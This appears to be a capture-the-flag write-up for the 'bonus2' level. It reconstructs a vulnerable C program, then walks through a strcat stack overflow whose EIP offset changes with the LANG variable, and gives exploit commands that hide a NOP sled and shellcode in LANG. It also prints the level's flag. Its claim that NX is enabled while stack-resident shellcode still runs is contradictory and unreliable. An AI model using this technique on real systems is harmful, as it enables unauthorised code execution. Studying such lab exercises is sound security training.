# bonus2 — strcat overflow, shellcode hidden in an environment variable

**Teaches:** how env vars live on the stack; using `LANG` both to grow the
prefix (changing the offset) and to carry the shellcode.

## 1–2. Reconstructed C
```c
int lang = 0;
void greetuser(char *user) {
    char buffer[64];
    if (lang == 1) strcpy(buffer, "Hyv\xc3\xa4\xc3\xa4 p\xc3\xa4iv\xc3\xa4\xc3\xa4 "); // "fi"
    else if (lang == 2) strcpy(buffer, "Goedemiddag! ");                              // "nl"
    else strcpy(buffer, "Hello ");
    strcat(buffer, user);                 // <-- overflow: greeting + user > 64
    puts(buffer);
}
int main(int ac, char **av) {
    char buffer[72];
    if (ac != 3) return 1;
    memset(buffer, 0, 72);
    strncpy(buffer, av[1], 40);
    strncpy(&buffer[40], av[2], 32);
    char *env = getenv("LANG");
    if (env && memcmp(env, "fi", 2) == 0) lang = 1;
    else if (env && memcmp(env, "nl", 2) == 0) lang = 2;
    greetuser(buffer);
    return 0;
}
```

## 3. The vulnerability
`greetuser` copies a fixed greeting then `strcat`s our 72-byte `buffer` into a
64-byte local — overflow. The greeting's length shifts where our bytes land, so
the **offset to EIP depends on LANG**:
- LANG unset (`"Hello "`): too short to reach EIP.
- `LANG=fi` (longer greeting): offset **18**.
- `LANG=nl` (`"Goedemiddag! "`): offset **23**.

NX is enabled on bonus2's stack in some builds — the reliable trick is to store
shellcode in the **`LANG` env var** (after the 2-letter language tag) and return
into it.

## 4. Step by step
1. Put shellcode in LANG, right after `nl`/`fi`, behind a NOP sled:
   ```
   export LANG=$(python -c 'print "nl" + "\x90"*100 + "<21-byte shellcode>"')
   ```
2. Find LANG's address on the stack, then pick an address inside the sled:
   ```
   (gdb) b *main+125 ; run $(python -c 'print "A"*40') bla
   (gdb) x/20s *((char**)environ)     # e.g. 0xbffffeb4 -> +0x32 = 0xbffffee6
   ```

## 5. Exploit
```
# LANG=nl -> offset 23
./bonus2 $(python -c 'print "A"*40') $(python -c 'print "B"*23 + "\xe6\xfe\xff\xbf"')
# LANG=fi -> offset 18
./bonus2 $(python -c 'print "A"*40') $(python -c 'print "B"*18 + "\xe6\xfe\xff\xbf"')
```
**Why it works:** the greeting + argv[2] overflow `buffer[64]`; at the LANG-specific
offset the 4-byte return address lands on EIP and points into the NOP sled in the
LANG env var, sliding into the shellcode.

Flag → `71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587`
